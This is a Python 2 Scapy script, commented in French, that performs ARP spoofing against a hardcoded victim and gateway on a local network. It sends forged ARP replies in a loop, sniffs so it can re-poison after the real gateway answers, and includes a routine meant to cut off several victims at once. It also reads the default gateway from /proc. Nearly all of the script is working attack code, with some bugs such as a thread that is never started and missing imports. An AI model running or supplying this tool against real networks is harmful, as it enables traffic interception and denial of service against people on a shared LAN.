#!/usr/bin/python
# coding: utf-8
from scapy.all import *
import netifaces
from subprocess import Popen, PIPE
import threading
import re
import time 
  
class couperVictime(threading.Thread): 
    def __init__(self, IpVictim, MacVictim, IpGw, MacGw): 
        threading.Thread.__init__(self)
        self.Terminated = False 
	self.IpVictim = IpVictim
	self.MacVictim = MacVictim
	self.IpGw = IpGw
	self.MacGw = MacGw
    def run(self): 
        while not self.Terminated: 
             #Creation du faux paquet pour envoyer a la victime
		fauxARP = ARP()
		fauxARP.op = 2
		fauxARP.psrc = self.IpGw
		fauxARP.pdst = self.IpVictim
		fauxARP.hwdst = self.MacVictim

		fauxARPGW = ARP()
		fauxARPGW.op=2
		fauxARPGW.psrc= self.IpVictim
		fauxARPGW.pdst= self.IpGw
		fauxARPGW.hwdst= self.MacGw

		#On envoie toujours le faux ARP quand le cache n'est pas usurpe
		

		#On envoie le faux ARP
		print self.Terminated
		send(fauxARP)
		send(fauxARPGW)

		#Apres un moment, le gateway par defaut envoie un ARP pour donner son adresse MAC
		#La victime n'est plus trompee et la communication ne passe plus par l'attaquant
		#Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
		#Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
		sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)
        print "le thread s'est termine proprement" 
    def stop(self): 
        self.Terminated = True


def main():
	#Solution provisoire en attendant 
	#Apres on va prendre les donnees de l'utilisateur

	#Récupération de l'adresse IP et MAC de l'attaquant 
	ok = True
	for interface in netifaces.interfaces():
		if(str(interface) == 'lo0' or str(interface) == 'lo'):
			pass
		else:
			try:
				attaquantIP = netifaces.ifaddresses(interface)[2][0]['addr']
				attaquantMAC = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
			except:
				ok = False
				pass

	#Autre manière qui fonctionne de récupérer son addresse IP 
	#hostname = socket.gethostname()
	#attaquantIP = socket.gethostbyname(hostname)


	victimeIP="192.168.0.100"
	victimeMAC="24:0A:64:63:BF:65"
	gatewayIP="192.168.0.1"
	gatewayMAC="AC:F1:DF:64:30:FC"
	couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC)

#À tester
#Gérer des threads ? 
#Attention à pas couper la gateway
def couperTous(tabMACIPVictime, tabMACIPGateway):
	while True:
		for i in range(len(tabMACIPVictime)):
			macV, ipV = tabMACIPVictime[i]
			macG, ipG = tabMACIPGateway[i]
			couperVictime(ipV, macV, ipG, macG)




def get_default_gateway_linux():
	"""Read the default gateway directly from /proc."""
	with open("/proc/net/route") as fh:
		for line in fh:
		    fields = line.strip().split()

		    if fields[1] != '00000000' or not int(fields[3], 16) & 2:
			continue

		    IP = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
	

	#IP = "192.168.10.111"
	Popen(["ping", "-c 1", IP], stdout = PIPE)
	pid = Popen(["arp", "-n", IP], stdout = PIPE)
	s = pid.communicate()[0]
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	Tab = []
	print "Routeur : %s--> %s" % (IP, mac)
	couple = (IP,mac)
	Tab.append(couple)
	return Tab

#main()
